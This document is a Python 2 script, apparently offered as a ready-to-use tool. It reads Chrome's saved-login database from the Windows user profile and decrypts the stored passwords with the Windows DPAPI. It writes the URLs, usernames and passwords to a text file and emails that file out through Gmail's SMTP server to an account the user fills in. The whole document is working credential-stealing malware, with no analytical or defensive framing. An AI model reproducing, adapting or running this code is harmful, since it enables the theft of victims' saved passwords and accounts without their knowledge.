import os
import sqlite3
import win32crypt
import sys
import mimetypes
import smtplib
from email.mime.multipart import MIMEMultipart
from email import encoders
from email.message import Message
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.text import MIMEText

# Create File

f = open('passwords.txt','w')

# Find path

try:
    path = sys.argv[1]
except IndexError:
    for w in os.walk(os.getenv('USERPROFILE')):
        if 'Chrome' in w[1]:
            path = str(w[0]) + '\Chrome\User Data\Default\Login Data'

# Connect to the Database
try:
    print '[+] Opening ' + path
    conn = sqlite3.connect(path)
    cursor = conn.cursor()
except Exception, e:
    print '[-] %s' % (e) 
    sys.exit(1)

# Get the results
try:
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
except Exception, e:
    print '[-] %s' % (e)
    sys.exit(1)

data = cursor.fetchall()

if len(data) > 0:
    for result in data:
    # Decrypt the Password
        try:
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        except Exception, e:
            print '[-] %s' % (e)
            pass
        if password:
            f.write('''[+] URL: %s\n Username: %s\n Password: %s\n''' %(result[0], result[1], password))
            
else:
    print '[-] No results returned from query'
    sys.exit(0)

# Your Email Account

emailfrom = "youremail"
emailto = "youremail"
fileToSend = "passwords.txt"      
user = "youremail"
password = "yourpassword"

# Start Emailing
msg = MIMEMultipart()
msg['From'] = emailfrom
msg['To'] = emailto
msg['Subject'] = 'Password List'
filename = "passwords.txt"
f = file(filename)
attachment = MIMEText(f.read())
attachment.add_header('Content-Disposition', 'attachment', filename=filename)           
msg.attach(attachment)

smtp = smtplib.SMTP('smtp.gmail.com:587')
smtp.starttls()
smtp.login(user,password)
smtp.sendmail(emailfrom, emailto, msg.as_string())
smtp.close()

print('[+] Successfully Completed') 
